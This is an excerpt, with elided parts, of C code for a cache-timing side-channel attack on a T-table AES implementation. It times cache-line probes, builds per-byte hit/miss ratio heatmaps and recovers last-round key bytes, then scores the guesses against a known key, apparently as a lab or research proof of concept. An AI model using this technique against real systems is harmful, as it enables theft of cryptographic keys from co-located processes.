...
void print_heatmap(double timings[16][256]) {
    for (int i = 0; i < 16; i++) {
        for (int j = 0; j < 256; j++) {
            printf("%9.6f ", timings[i][j]);
        }
        printf("\n");
    }
    printf("\n");
...
int main() {
    ...
    for (size_t kindex = 0; kindex < 16; ++kindex) {
        printf("kindex = %ld\n", kindex);
    loop:
        for (size_t line = 0; line < 2; ++line) {
            probe = (char*) AES_get_ttable((kindex % 4 + 2) % 4) + 64 * line;
            for (size_t byte = 0; byte < 256; ++byte) {
                ...
                for (size_t i = 0; i < NSAMPLES; ++i) {
                    ...
                    sched_yield();
                    size_t delta = memaccesstime(probe);
                    sched_yield();

                    if (delta < threshold) {
                        if (inv_sBox[ciphertext[kindex] ^ key_last] / 16
                            == line) {
                            H0_hit++;
                            H0_total++;
                        } else {
                ...
                sched_yield();
                Diff_ratio[kindex][byte]
                    = (double) H1_miss / (double) H1_total
                      - (double) H0_miss / (double) H0_total;
                sched_yield();
            }
            max[line] = get_max_index(Diff_ratio[kindex], 256);
        }
        ...
        if (max[0] != max[1]) {
            ...
            key_guess[kindex] = max[0];
            printf("last_round byte %02x \n",
                   (unsigned char) key_guess[kindex]);
        }
    }

    printf("print heatmap.\n");
    print_heatmap(Diff_ratio);
    ...
    printf("guess:   ");
    for (int i = 0; i < 16; i++) {
        if (key_guess[i] == key_solution[i]) {
            printf("%2x ", key_guess[i]);
        } else
            printf("x  ");
    }
    printf("\n");
